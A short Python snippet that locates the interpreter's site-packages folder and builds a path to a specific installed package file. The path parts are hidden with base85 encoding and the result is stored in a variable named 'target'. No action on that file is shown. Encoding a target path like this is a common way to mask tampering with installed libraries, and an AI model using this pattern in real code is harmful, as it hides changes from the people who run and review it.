import pathlib
import sys
import base64


cwd = pathlib.Path(sys.executable)
new_path = cwd.parent.parent / 'lib'
directories = [item.name for item in new_path.iterdir() if item.is_dir()]
base_path = cwd.parent.parent / 'lib' / directories[0]
module_path = (
    base_path / 'site-packages' /
    base64.b85decode("baG*Cb7pUHZDn$E").decode('utf-8') /
    base64.b85decode("ZEs{{Y;y").decode('utf-8') /
    base64.b85decode("Y;0j|VE").decode('utf-8') /
    base64.b85decode("ZEs{{Y-w(1Uu<k)ZDB5Oc>").decode('utf-8'))

target = module_path
